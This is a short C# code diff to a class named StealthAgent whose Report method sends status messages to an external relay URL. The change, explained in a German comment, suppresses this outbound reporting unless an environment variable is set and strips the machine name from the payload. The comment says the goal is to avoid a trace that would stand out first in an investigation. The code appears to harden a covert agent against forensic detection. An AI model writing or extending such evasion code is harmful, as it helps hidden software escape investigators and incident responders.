@@ -98,17 +98,16 @@ public static class StealthAgent
     // stops when it never shows up in /api/status. Never throws, never blocks.
     public static void Report(string step, string msg)
     {
+        // Kein Funkverkehr nach aussen und kein Rechnername im Netz: das war
+        // eine Spur, die bei einer Untersuchung als Erstes auffaellt. Nur wenn
+        // ausdruecklich eingeschaltet, und dann ohne Geraetename.
+        if(Environment.GetEnvironmentVariable("PANIC_REPORT")!="1")return;
         _ = Task.Run(async () =>
         {
             try
             {
                 using var c = new HttpClient { Timeout = TimeSpan.FromSeconds(6) };
-                var json = JsonSerializer.Serialize(new
-                {
-                    machine = Environment.MachineName,
-                    step = step,
-                    msg = msg
-                });
+                var json = JsonSerializer.Serialize(new { step, msg });
                 using var content = new StringContent(json, Encoding.UTF8, "application/json");
                 await c.PostAsync($"{RelayUrl}/api/report", content);
             }
